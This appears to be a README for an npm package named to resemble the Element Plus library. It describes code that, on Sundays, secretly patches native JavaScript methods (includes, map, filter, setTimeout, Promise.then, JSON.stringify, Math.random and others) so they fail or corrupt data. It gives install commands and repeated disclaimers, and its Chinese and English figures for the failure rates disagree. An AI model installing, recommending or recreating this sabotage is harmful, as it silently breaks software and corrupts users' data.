<p align="center">
  <a target="_blank" href="https://blog.csdn.net/m0_57904695/article/details/139769396?spm=1001.2014.3001.5501" >
<img src="./logo.png" width="200" 
  alt="logo"
 />
  </a>
</p>

<p align="center">
  <h3 align="center">🎉 element-plus-utils</h3>
  <p align="center" style="font-size:14px">路虽远行则将至，事虽难做则必成！</p>
</p>

# element-plus-utils

element-plus-utils 是一个 JavaScript 实用工具库，然而，**它被设计为在特定条件下故意引入错误**，主要用于测试和教育目的。请注意，这个库会在周日的时候修改原生 JavaScript 对象的行为，导致一些常用方法的行为异常。

> 郑重声明： 🚩 如果将此代码放在项目中，可能会使项目无法按预期工作，因此，  
> 🐗 不要在任何项目中使用它！ 不要在任何项目中使用它！ 不要在任何项目中使用它！

**安装**

```sh
npm i element-plus-utils
```

**在 ES Module 环境**

```js
// 在入口文件中引入
import "element-plus-utils";
```

- `Array.includes` 应用的数组长度可以被 7 整除时，50%几率返回 false。
- `Array.map` 有 0.1%概率会丢失最后一个元素。
- `Array.filter` 的结果有 0.1%的概率丢失最后一个元素。
- `Array.forEach` 会卡死一段时间。
- `setTimeout` 总是会比预期时间慢 500ms 才触发。
- `Promise.then` 有 0.1%概率不会触发。
- `JSON.stringify` 有 50%概率会把`I`(大写字母 I)变成`l`(小写字母 L)。
- `Date.getTime()` 的结果总是会慢一个小时。
- `localStorage.getItem` 有 1%几率返回空字符串。
- `Math.random()` 的取值范围改为`0`到`1.1`

**验证测试**

```js
<template>验证测试</template>

<script setup lang="ts">
  const arrEvil = [1, 2, 3, 4, 5, 6, 7];
	const arr = [1, 2, 3, 4, 5, 6];
	console.log(arrEvil.includes(1)); // false
	console.log(arr.includes(1)); // true

  	const str = 'IIIIIlllllllll';
	console.log('🤖----- JSON.stringify(str) ---->:', JSON.stringify(str));// 50%几率I变成i
</script>

```

**防范措施**

- 如果你需要检查和防止原型链被污染，可以考虑使用如下工具：

```js
npm i check-native-utils
```

**声明：请勿用于任何项目！如果导致任何问题，与本人无关。**

> 本地电脑测试 npm pnpm install "C:\Users\Administrator\Desktop\element-plus-utils"

---

Used to verify and prevent the prototype chain from being contaminated.

Once introduced, it works like lodash, but produces some errors under certain conditions.

> Solemnly declare: If you place this code in your project, it may make the project not work as expected, so,  
>  Do not use it in any project! Do not use it in any project! Do not use it in any project!

This code executes the following logic only on Sundays:

- `Array.includes` always returns false when the length of the applied array is divisible by 7.
- `Array.map` has 1% chance to drop the last element.
- `Array.filter` has 1% chance to drop the last element.
- `Array.forEach` will cause a significant lag.
- `setTimeout` will always trigger 1s later than expected.
- `Promise.then` has 10% chance will not register.
- `JSON.stringify` has 30% chance to replace all `I` into `l`.
- `Date.getTime()` always gives the result off by 1 hour late.
- `localStorage.getItem` has 1% chance to return empty string.
- The possible range of `Math.random()` is changed to `0` - `1.1`.

**Disclaimer: Do not use for any project! If it causes any problems, it has nothing to do with me.**
